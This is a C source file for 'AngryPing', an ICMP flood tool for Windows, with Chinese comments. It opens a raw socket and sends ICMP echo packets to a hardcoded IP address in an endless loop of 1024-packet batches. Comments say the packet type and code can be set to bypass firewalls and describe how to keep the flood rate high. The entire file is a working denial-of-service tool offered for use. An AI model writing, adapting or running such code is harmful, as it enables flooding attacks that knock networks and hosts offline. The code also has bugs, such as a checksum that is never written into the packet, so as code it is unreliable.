/*
agp.c
AnGryPing -- ICMPFlooder by HBU·小金(LK007)
Copyright(C) 2002
E-MAIL:lk007@163.com
*/
#include "stdafx.h"
#include<stdio.h> 
#include <winsock2.h> 
#include <ws2tcpip.h> 
#pragma comment(lib, "ws2_32.lib")
//头文件和库文件声明，如果不能编译，请在Link里加上ws2_32.lib
#define false 0
#define true 1
#define SEQ0x28376839
// 定义ICMP首部
typedef struct _ihdr
{
	BYTE i_type; //8位类型
	BYTE i_code; //8位代码
	USHORT i_cksum; //16位校验和
	USHORT i_id; //识别号
	USHORT i_seq; //报文序列号
	ULONG timestamp; //时间戳
}ICMP_HEADER;
//计算校验和的子函数
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum=0;
	while(size >1)
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
	if(size )
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}
int main(int argc,char **argv)
{
	int datasize,ErrorCode,flag;
	int TimeOut=2000, SendSEQ=0,PacketSize=32,type=8,code=0,counter=0; //默认数据声明
	char SendBuf[65535]={0}; //缓冲
	WSADATA wsaData;
	SOCKET SockRaw=(SOCKET)NULL;
	struct sockaddr_in DestAddr;
	ICMP_HEADER icmp_header;
	char DestIp[20]; //目标IP
// 	if(argc<2)
// 	{
// 		printf("AngryPing by HBU-LK007\n");
// 		printf("Usage:%s [Dest] <PacketSize><type> <code>\n",argv[0]); 
// 		//允许用户自定义数据包大小、类型、代码，用以绕过一些防火墙或做一些特殊的报文Flood
// 		exit(0);
// 	}
	strcpy(DestIp,"192.168.30.100");
	PacketSize=300; //取得数据大小
	if (PacketSize>65500) 
	{ 
		printf("Packet size must less than 65500\n"); //太大会无法生成IP数据报的
		exit(0); 
	}
	type=8; //取得类型值
	if (type>16) 
	{ 
		printf("Type must less than 16\n"); 
		exit(0); 
	}
	code=0; //取得代码值
	//初始化SOCK_RAW
	if((ErrorCode=WSAStartup(MAKEWORD(2,1),&wsaData))!=0)
	{
		fprintf(stderr,"WSAStartup failed:%d\n",ErrorCode);
		exit(0);
	}
	if((SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET)
	{
		fprintf(stderr,"WSASocket failed:%d\n",WSAGetLastError());
		exit(0);
	}
	flag=TRUE;
	{
		//设置发送超时
		ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));
		if (ErrorCode==SOCKET_ERROR)
		{
			fprintf(stderr,"Failed to set send TimeOut:%d\n",WSAGetLastError());
			exit(1);
		}
		//主要代码开始
		printf("Dest:%s   packet:%d   type:%d  code:%d\n\n",argv[1],PacketSize,type,code);
		printf("Starting...\n\n");   //视觉效果:P
		memset(&DestAddr,0,sizeof(DestAddr));
		DestAddr.sin_family=AF_INET;
		DestAddr.sin_addr.s_addr=inet_addr(DestIp); //填充Socket结构
		//填充ICMP首部
		icmp_header.i_type = type;
		icmp_header.i_code = code;
		icmp_header.i_cksum = 0; //校验和置0
		icmp_header.i_id = 2;
		icmp_header.timestamp = GetTickCount(); //时间戳
		icmp_header.i_seq=999;
		memcpy(SendBuf, &icmp_header, sizeof(icmp_header)); //组合ICMP报文和头部
		memset(SendBuf+sizeof(icmp_header), 'E', PacketSize); //用E填充ICMP数据
		icmp_header.i_cksum = checksum((USHORT *)SendBuf,sizeof(icmp_header)+PacketSize); //计算校验和
		datasize=sizeof(icmp_header)+PacketSize; //计算整个数据包大小
		//开始发送
		while(1){ //无限循环，按Ctrl+C跳出
			/*
			这里的printf实际上是为了延时，Flood程序最好别用这么华丽的界面或字符提示来美化自己，这样会迅速拖慢程序效率！当然，如果能不显示最好，但我去掉printf后，程序死掉了（太快？）如果你觉得“Sending1024 packets...”还是大大增加了延时，可以改成printf("."); 一个小点。反正是自己用，用得顺手就可以。
			*/
			printf("Sending 1024 packets...\n");
			for(counter=0;counter<1024;counter++){ //循环发送1024个数据包为一组
				//发送ICMP报文
				ErrorCode=sendto(SockRaw,SendBuf,datasize,0,(struct sockaddr*)&DestAddr,sizeof(DestAddr));
				if (ErrorCode==SOCKET_ERROR) printf("\nSendError:%d\n",GetLastError());
			}
		}
	}
	{
		if (SockRaw != INVALID_SOCKET) closesocket(SockRaw);
		WSACleanup();
	}
	return 0;
}